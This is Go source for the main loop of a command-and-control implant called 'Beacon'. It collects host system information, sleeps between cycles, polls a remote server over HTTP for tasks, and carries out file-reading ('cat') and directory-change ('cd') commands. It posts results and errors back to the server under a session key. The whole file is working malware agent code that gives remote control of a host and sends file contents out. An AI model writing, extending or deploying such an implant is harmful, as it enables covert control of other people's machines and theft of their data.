package main

import (
	"Beacon/command"
	"Beacon/profile"
	"Beacon/sysinfo"
	"Beacon/utils/common"
	"Beacon/utils/packet"
	"errors"
	"fmt"
	"time"
)

var heartBeat sysinfo.HeartBeat

func main() {
	var (
		AssemblyBuff []byte
		err          error
		res          []byte
		finalpacket  []byte
	)

	profile.BeaconProfile, err = profile.LoadConfig()
	if err != nil {
		panic(err)
	}
	fmt.Printf("%+v\n", profile.BeaconProfile)

	heartBeat = sysinfo.InitHeartBeat()
	fmt.Printf("%+v\n", heartBeat)

	metaData := sysinfo.PackHeartBeat(heartBeat)
	for {
		time.Sleep(time.Duration(profile.BeaconProfile.Sleep) * time.Second)
		AssemblyBuff, err = common.HttpGet(metaData, heartBeat.SessionKey)
		println(string(AssemblyBuff))
		if err == nil {
			parser := packet.CreateParser(AssemblyBuff)
			for parser.Size() > 0 {
				if parser.Size() < 4 {
					fmt.Println("Not enough data for length field")
					break
				}

				// 读取任务包
				taskData := parser.ParseBytes()
				taskParser := packet.CreateParser(taskData)

				// 解析任务ID和任务数据长度
				ok := taskParser.Check([]string{"int32", "int32"})
				if !ok {
					fmt.Println("Not enough data for taskId and commandId")
					break
				}
				taskId := taskParser.ParseInt32()
				commandId := taskParser.ParseInt32()

				switch commandId {
				case profile.COMMAND_CAT:
					res, err = command.Cat(taskParser, int(heartBeat.ACP))
					fmt.Println("taskID: ", taskId)
				case profile.COMMAND_CD:
					res, err = command.Cd(taskParser, int(heartBeat.ACP))
				default:
					err = errors.New("This type is not supported now.")
				}

				if err != nil {
					fmt.Println("Error:", err)
					finalpacket = packet.MakeFinalPacket(taskId, profile.COMMAND_ERROR_REPORT, []byte(err.Error()))
					println(len(finalpacket))
				} else {
					finalpacket = packet.MakeFinalPacket(taskId, commandId, res)
					println(len(finalpacket))
				}
				common.HttpPost(metaData, finalpacket, heartBeat.SessionKey)
			}
		}
	}
}
